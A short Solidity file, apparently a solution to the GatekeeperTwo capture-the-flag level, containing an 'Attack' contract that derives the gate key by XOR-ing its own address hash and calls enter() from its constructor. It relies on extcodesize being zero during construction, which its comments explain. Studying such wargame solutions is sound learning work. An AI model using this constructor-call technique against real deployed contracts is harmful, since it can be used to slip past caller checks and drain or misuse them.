// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {
    constructor(address _addr) public {
        /// @dev switching out operands will give us our key to pass in.
        bytes8 _key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
                (uint64(0) - 1)
        );
        /// @dev abi.encodeWithSignature() is how we import another contracts function when we haven't imported its Interface
        _addr.call(abi.encodeWithSignature("enter(bytes8)", _key));
    }
}

/// @dev As explained in the gatekeeperTwo Contract, we can switch operands;
// A xor of B == C (1010 ^ 1111 == 0101)
// A xor of C == B (1010 ^ 0101 == 1111)

/// @dev We are checking for the smart contracts code during construction as it is going to return 0.. That is the requirement for gateTwo modifier.
/*
    When a contract is being constructed, it gets a pre made address which completes gateOne modifier, but not everything is associated with that address until construction has finished.
    So while we call the function of another contract inside of our constructor, extcodesize(caller), which is Attack will equal 0;
*/
